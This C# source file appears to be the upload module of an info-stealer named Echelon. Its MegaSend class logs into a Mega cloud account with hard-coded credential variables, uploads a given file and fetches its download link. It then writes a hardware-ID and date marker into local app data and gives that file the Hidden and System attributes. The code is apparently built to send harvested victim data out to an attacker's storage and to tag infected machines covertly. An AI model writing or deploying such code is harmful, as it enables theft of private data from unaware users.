using System.IO;
using System.Linq;
using CG.Web.MegaApiClient;

namespace Echelon.Global
{
    internal class MegaSend : Program
    {
        public static readonly MegaApiClient client = new MegaApiClient();

        public static void Send(string file)
        {
            client.Login(megaLOGIN, megaPass);
            Upload(file);
            client.Logout();
            //Help.Hwid file
            File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
            File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
        }

        public static void Upload(string file)
        {
            var nodes = client.GetNodes();
            var root = nodes.Single(x => x.Type == NodeType.Root);
            var myFile = client.UploadFile(file, root);
            var haha = client.GetDownloadLink(myFile);
        }
    }
}
